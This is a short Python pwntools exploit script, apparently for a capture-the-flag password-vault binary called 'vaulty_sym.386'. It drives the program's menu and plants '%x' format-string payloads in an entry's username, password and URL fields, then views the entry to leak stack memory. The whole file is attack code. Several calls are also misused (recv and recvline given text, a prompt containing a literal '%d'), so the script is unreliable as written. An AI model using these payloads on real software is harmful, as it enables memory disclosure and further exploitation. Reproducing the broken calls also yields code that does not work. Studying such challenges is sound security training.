from pwn import*

context.log_level = 'debug'

r = process("./vaulty_sym.386")

def create_entry(name, pw, url):
    r.sendlineafter(b"Enter your choice (1-5):\n", b"1")
    r.sendlineafter(b"Username:\n", name)
    r.sendlineafter(b"Password:\n", pw)
    r.sendlineafter(b"URL", url)

def edit_entry(name, pw, url, entry):
    r.sendlineafter(b"Enter your choice (1-5):\n", b"2")
    r.sendlineafter(b"Select an entry to view (0-%d):\n", str(entry).encode())
    r.sendlineafter(b"New Username:\n", name)
    r.sendlineafter(b"New Password:\n", pw)
    r.sendlineafter(b"New URL:\n", url)
    r.recvline(b"Entry modified successfully.")

def delete_entry(name, pw, url, entry):
    r.sendlineafter(b"Enter your choice (1-5):\n", b"3")
    r.sendlineafter(b"Select an entry to delete ", str(entry).encode())
    r.recvline(b"Entry modified successfully.")

def view_entry(entry):
    r.sendlineafter(b"Enter your choice (1-5):\n", b"4")
    r.sendlineafter(b"Select an entry to view ", str(entry).encode())
    r.recv(b"Username: ")
    name = r.recvline()
    print(name)
    r.recv(b"Password: ")
    pw = r.recvline()
    print(pw)
    r.recv(b"Url: ")
    url = r.recvline()
    print(url)

create_entry(b"%x %x %x %x %x %x %x %x",b"%x %x %x %x %x %x %x %x", b"%x %x %x %x %x %x %x %x")
view_entry(0)
r.interactive()
